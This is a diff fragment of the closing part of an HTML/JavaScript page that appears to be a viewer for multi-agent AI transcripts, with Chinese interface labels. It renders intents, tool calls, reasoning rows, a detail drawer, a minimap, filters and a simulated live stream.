+    const n = steps.filter(s => iidsOf(s).includes(it.id) && s.w === it.worker).length;
+    h += `<span class="icard ${iFilter===it.id?'on':''}" data-iid="${it.id}" title="点击只显示该意图的步骤">
+      <span class="iid">${it.id}</span><span class="itext">${esc(it.text)}</span>
+      <span class="iarrow">→</span><span class="iw" style="background:${WORKER_COLOR[it.worker]}">${WORKER_LABEL[it.worker]}</span>
+      <span class="ist ${it.status==='done'?'done':'run'}">${it.status==='done'?'✓':'●'} ${n}步</span></span>`;
+  });
+  if (iFilter) h += `<span class="fchip" data-iid="">✕ 清除意图过滤</span>`;
+  document.getElementById('intentbar').innerHTML = h;
+}
+
+// ── 行渲染 ──
+function iTag(st) {
+  const ids = iidsOf(st).filter(id => st.k !== 'intent');
+  return ids.map(id => `<span class="itag" title="所属意图 ${id}">${id}</span>`).join('');
+}
+function rowHTML(st) {
+  const wc = WORKER_COLOR[st.w];
+  const chip = `<span class="wchip" style="background:${wc}">${WORKER_LABEL[st.w]}</span>`;
+  if (st.k === 'round') return `<div class="round-divider" data-seq="${st.seq}">${st.s}</div>`;
+  if (st.k === 'user') return `
+    <div class="user-bubble-row" data-seq="${st.seq}">
+      <div class="user-bubble">${esc(st.s)}</div>
+      <div class="user-avatar">${ICONS.user}</div>
+    </div>`;
+  if (st.k === 'result') return `
+    <div class="row answer-card ${selSeq===st.seq?'sel':''}" data-seq="${st.seq}">
+      <div style="display:flex;gap:4px;align-items:center">${chip}${iTag(st)}</div>
+      <div class="answer-body">${esc(st.s)}</div>
+      <span class="ts">${st.ts||''} · seq ${st.seq}${st.tk?` · ${st.tk} tokens`:''}</span>
+    </div>`;
+  if (st.k === 'intent') {
+    const ids = iidsOf(st);
+    const assigns = ids.map(id => {
+      const it = intentById(id);
+      return it ? `<span class="assign">→ <span class="wchip" style="background:${WORKER_COLOR[it.worker]};margin-top:0">${WORKER_LABEL[it.worker]}</span>${it.status==='done'?'✓':'●'}</span>` : '';
+    }).join('');
+    return `
+    <div class="row intent-row ${selSeq===st.seq?'sel':''}" data-seq="${st.seq}">
+      ${ICONS.flag}${chip}<span class="intent-chip"><span class="t">${esc(st.s)}</span></span>${assigns}
+    </div>`;
+  }
+  if (st.k === 'tool_use') {
+    const ok = st.st === 'ok';
+    const tone = ok ? 'var(--emerald)' : 'var(--red)';
+    return `
+    <div class="row ${selSeq===st.seq?'sel':''}" data-seq="${st.seq}">
+      <button class="row-head" onclick="event.stopPropagation();toggleRow(this)">
+        ${ICONS.chev}${ICONS.wrench(tone)}${chip}${iTag(st)}
+        <span class="tool-name">${esc(st.tool)}</span>
+        <span class="trunc mono" style="color:var(--muted-foreground)">${esc(typeof st.input==='object'?st.input.cmd||JSON.stringify(st.input):st.input)}</span>
+        <span class="${ok?'status-ok':'status-err'}">${ok?'✓':'✗'} ${dur(st.dur)}</span>
+      </button>
+      <pre class="detail-pre" style="display:none">${st.err?'[stderr] '+esc(st.err)+'\n':''}${esc(st.out||'')}</pre>
+    </div>`;
+  }
+  const isThink = st.k === 'thinking';
+  const meta = isThink && st.sec ? ` · ${st.sec}s · ~${st.tk} tok` : '';
+  return `
+    <div class="row ${selSeq===st.seq?'sel':''}" data-seq="${st.seq}">
+      <button class="row-head" onclick="event.stopPropagation();toggleRow(this)">
+        ${ICONS.chev}${isThink?ICONS.brain:ICONS.msg}${chip}${iTag(st)}
+        <span class="trunc ${isThink?'thinking-tone':'text-tone'}">${esc(st.s)}</span>
+        ${isThink?`<span class="sub-note">· 含推理${meta}</span>`:''}
+      </button>
+      ${st.d?`<pre class="detail-pre" style="display:none">${esc(st.d)}</pre>`:''}
+    </div>`;
+}
+window.toggleRow = btn => {
+  const pre = btn.parentElement.querySelector('.detail-pre');
+  if (!pre) return;
+  const open = pre.style.display === 'none';
+  pre.style.display = open ? 'block' : 'none';
+  btn.querySelector('.chev').classList.toggle('open', open);
+  requestAnimationFrame(layoutMinimap);
+};
+
+function renderTranscript(flashSeq) {
+  vp.innerHTML = steps.map(st => visible(st) ? rowHTML(st) : '').join('') +
+    (liveTimer ? '<div class="stream-dots"><i></i><i></i><i></i><span class="sub-note" style="margin-left:6px">实时流式中…</span></div>' : '');
+  if (flashSeq) {
+    const el = vp.querySelector(`[data-seq="${flashSeq}"]`);
+    if (el) el.classList.add('flash');
+  }
+  layoutMinimap();
+}
+
+// ── 详情抽屉 ──
+const drawer = document.getElementById('drawer');
+function openDrawer(st) {
+  selSeq = st.seq;
+  vp.querySelectorAll('.row.sel, .intent-row.sel').forEach(r => r.classList.remove('sel'));
+  const row = vp.querySelector(`.row[data-seq="${st.seq}"]`) || vp.querySelector(`[data-seq="${st.seq}"]`);
+  if (row && row.classList) row.classList.add('sel');
+  mm.querySelectorAll('.mm-block.sel').forEach(b => b.classList.remove('sel'));
+  const blk = mm.querySelector(`.mm-block[data-seq="${st.seq}"]`);
+  if (blk) blk.classList.add('sel');
+
+  const km = KIND_META[st.k];
+  document.getElementById('drTitle').innerHTML =
+    `<span class="tt-w" style="background:${WORKER_COLOR[st.w]};font-size:9px;border-radius:3px;padding:1px 4px;color:#fff">${WORKER_LABEL[st.w]}</span> ` +
+    `<span style="color:${km.c}">${km.label}</span> <span style="color:var(--muted-foreground);font-weight:400">#${st.seq}</span>`;
+  const ids = iidsOf(st);
+  let meta = `<span class="k">时间</span><span class="v">${st.ts||'—'}</span>` +
+             `<span class="k">执行者</span><span class="v">${WORKER_LABEL[st.w]}(${st.w})</span>` +
+             `<span class="k">类型</span><span class="v">${km.label}(${st.k})</span>`;
+  if (ids.length) meta += `<span class="k">所属意图</span><span class="v">${ids.map(id => {
+    const it = intentById(id);
+    return it ? `<span class="dr-link" onclick="filterIntent('${id}')">${id}</span> → ${WORKER_LABEL[it.worker]} ${it.status==='done'?'✓':'●'}` : id;
+  }).join(' · ')}</span>`;
+  if (st.sec) meta += `<span class="k">推理耗时</span><span class="v">${st.sec}s</span>`;
+  if (st.tk)  meta += `<span class="k">Token</span><span class="v">~${st.tk}</span>`;
+  if (st.dur) meta += `<span class="k">执行耗时</span><span class="v">${dur(st.dur)}</span>`;
+  if (st.tool) meta += `<span class="k">工具</span><span class="v mono">${esc(st.tool)}</span>`;
+  if (st.st)  meta += `<span class="k">状态</span><span class="v" style="color:${st.st==='ok'?'var(--emerald)':'var(--red)'}">${st.st==='ok'?'✓ 成功':'✗ 失败'}</span>`;
+  document.getElementById('drMeta').innerHTML = meta;
+
+  let body = '';
+  if (st.k === 'thinking' && st.d) body += `<div class="dr-sec">完整推理</div><div class="dr-think">${esc(st.d)}</div>`;
+  if (st.input) body += `<div class="dr-sec">工具入参</div><div class="dr-pre">${esc(JSON.stringify(st.input, null, 2))}</div>`;
+  if (st.err) body += `<div class="dr-sec">错误</div><div class="dr-pre err-text">${esc(st.err)}</div>`;
+  if (st.out) body += `<div class="dr-sec">工具输出</div><div class="dr-pre">${esc(st.out)}</div>`;
+  if (!body) body = `<div class="dr-sec">内容</div><div class="dr-pre" style="font-family:inherit">${esc(st.s)}</div>`;
+  if (st.k === 'thinking') body = `<div class="dr-sec">摘要</div><div class="dr-pre" style="font-family:inherit">${esc(st.s)}</div>` + body;
+  document.getElementById('drBody').innerHTML = body;
+  drawer.hidden = false;
+}
+document.getElementById('drClose').addEventListener('click', () => {
+  drawer.hidden = true; selSeq = null;
+  vp.querySelectorAll('.sel').forEach(r => r.classList.remove('sel'));
+  mm.querySelectorAll('.mm-block.sel').forEach(b => b.classList.remove('sel'));
+});
+
+// 点击行 → 详情(按钮区除外,按钮负责展开/折叠)
+vp.addEventListener('click', e => {
+  if (e.target.closest('.row-head')) return;
+  const row = e.target.closest('[data-seq]');
+  if (!row) return;
+  const st = steps.find(s => s.seq === +row.dataset.seq);
+  if (st) openDrawer(st);
+});
+
+// ── Minimap ──
+function layoutMinimap() {
+  mm.querySelectorAll('.mm-block').forEach(b => b.remove());
+  const rows = {};
+  vp.querySelectorAll('[data-seq]').forEach(r => rows[r.dataset.seq] = r.offsetTop);
+  const total = vp.scrollHeight || 1;
+  steps.forEach((st, i) => {
+    const b = document.createElement('div');
+    b.className = 'mm-block' + (st.k === 'intent' ? ' intent' : '') + (visible(st) ? '' : ' dim') + (selSeq === st.seq ? ' sel' : '');
+    const top = rows[st.seq] !== undefined ? rows[st.seq] / total : i / steps.length;
+    b.style.top = (top * 100) + '%';
+    b.style.background = KIND_META[st.k].c;
+    b.dataset.seq = st.seq;
+    mm.insertBefore(b, mmView);
+    b.addEventListener('mouseenter', () => {
+      const ids = iidsOf(st);
+      tip.style.display = 'block';
+      tip.innerHTML = `<span class="tt-w" style="background:${WORKER_COLOR[st.w]}">${WORKER_LABEL[st.w]}</span>` +
+        `<span style="color:${KIND_META[st.k].c === '#71717a' ? '#d4d4d8' : KIND_META[st.k].c}">${KIND_META[st.k].label}</span>` +
+        `<div class="tt-s">#${st.seq} · ${st.ts||''} · ${esc(st.s || '').slice(0, 60)}</div>` +
+        (ids.length ? `<div class="tt-i">${ids.map(id => { const it = intentById(id); return it ? `${id} → ${WORKER_LABEL[it.worker]}` : id; }).join(' · ')}</div>` : '');
+    });
+    b.addEventListener('mousemove', e => { tip.style.left = (e.clientX - tip.offsetWidth - 14) + 'px'; tip.style.top = (e.clientY + 10) + 'px'; });
+    b.addEventListener('mouseleave', () => tip.style.display = 'none');
+  });
+  document.getElementById('mmEdge').style.display = liveTimer ? 'block' : 'none';
+  syncView();
+}
+function syncView() {
+  const total = vp.scrollHeight, h = mm.clientHeight;
+  mmView.style.top = (vp.scrollTop / total * h) + 'px';
+  mmView.style.height = Math.max(14, vp.clientHeight / total * h) + 'px';
+}
+vp.addEventListener('scroll', () => requestAnimationFrame(syncView));
+window.addEventListener('resize', () => requestAnimationFrame(layoutMinimap));
+
+mm.addEventListener('click', e => {
+  if (e.target.classList.contains('mm-block')) {
+    const st = steps.find(s => s.seq === +e.target.dataset.seq);
+    if (!st || !visible(st)) return;
+    const el = vp.querySelector(`[data-seq="${st.seq}"]`);
+    if (el) { vp.scrollTop = el.offsetTop - vp.clientHeight/2; el.classList.remove('flash'); void el.offsetWidth; el.classList.add('flash'); }
+    openDrawer(st);
+    return;
+  }
+  const r = mm.getBoundingClientRect();
+  vp.scrollTop = (e.clientY - r.top) / r.height * vp.scrollHeight - vp.clientHeight/2;
+});
+
+// ── 筛选交互 ──
+document.getElementById('filterbar').addEventListener('click', e => {
+  const c = e.target.closest('.fchip'); if (!c) return;
+  if (c.dataset.w) {
+    const w = c.dataset.w;
+    if (wFilter.size === 0) wFilter.add(w);
+    else if (wFilter.size === 1 && wFilter.has(w)) wFilter.clear();
+    else wFilter.has(w) ? wFilter.delete(w) : wFilter.add(w);
+  } else {
+    const g = c.dataset.k;
+    kFilter.has(g) ? kFilter.delete(g) : kFilter.add(g);
+  }
+  renderFilterbar(); renderTranscript();
+});
+window.filterIntent = id => {
+  iFilter = (iFilter === id || !id) ? null : id;
+  renderIntentbar(); renderTranscript();
+};
+document.getElementById('intentbar').addEventListener('click', e => {
+  const c = e.target.closest('[data-iid]'); if (!c) return;
+  filterIntent(c.dataset.iid || null);
+});
+
+// ── 实时模拟 ──
+function atBottom() { return vp.scrollHeight - vp.scrollTop - vp.clientHeight < 40; }
+const btnLive = document.getElementById('btnLive');
+function stopLive() { clearInterval(liveTimer); liveTimer = null; btnLive.classList.remove('on'); btnLive.textContent = '▶ 模拟实时追加'; renderTranscript(); }
+btnLive.addEventListener('click', () => {
+  if (liveTimer) return stopLive();
+  if (!LIVE.length) return;
+  btnLive.classList.add('on'); btnLive.textContent = '⏸ 停止追加';
+  liveTimer = setInterval(() => {
+    if (!LIVE.length) return stopLive();
+    const stick = atBottom();
+    const st = LIVE.shift();
+    addSteps([st]);
+    renderFilterbar(); renderIntentbar(); renderTranscript(st.seq);
+    if (stick) vp.scrollTop = vp.scrollHeight;
+  }, 1400);
+});
+document.getElementById('btnReset').addEventListener('click', () => {
+  clearInterval(liveTimer); liveTimer = null;
+  btnLive.classList.remove('on'); btnLive.textContent = '▶ 模拟实时追加';
+  steps = []; seq = 0; selSeq = null; iFilter = null;
+  wFilter.clear(); kFilter.clear(); KIND_GROUPS.forEach(g => kFilter.add(g));
+  drawer.hidden = true;
+  addSteps(BASE); LIVE.length = 0; LIVE.push(...LIVE_BACKUP);
+  renderFilterbar(); renderIntentbar(); renderTranscript(); vp.scrollTop = 0;
+});
+
+// ── 启动 ──
+const LIVE_BACKUP = [...LIVE];
+addSteps(BASE);
+renderFilterbar(); renderIntentbar(); renderTranscript();
+vp.scrollTop = vp.scrollHeight;
+</script>
+</body>
+</html>
